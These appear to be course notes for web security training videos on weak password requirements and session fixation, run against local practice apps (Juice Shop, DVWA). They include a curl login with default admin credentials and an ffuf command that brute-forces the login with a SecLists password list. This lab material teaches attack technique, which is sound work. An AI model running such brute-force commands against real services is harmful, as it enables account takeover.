# Video 4.3

* [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)
* [GitHub: SecLists](https://github.com/danielmiessler/SecLists)

```sh
curl 'http://localhost:3000/rest/user/login' -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"admin"}'
```

```sh
# don't want to skip 401, as we can get some brute-force prevention error message
# with 401 Unauthorized code
ffuf -u 'http://localhost:3000/rest/user/login' -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' -fs 26 -w /usr/share/seclists/Passwords/probable-v2-top12000.txt:FUZZ
```

# Video 4.4

* [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
* [File: dvwa-session.sh](dvwa-session.sh)

```sh
# execute curl 2 times a second
for i in {1..10}; do dvwa-session;sleep 0.5; done
```

```sh
date -d @UNIX_TIME
```
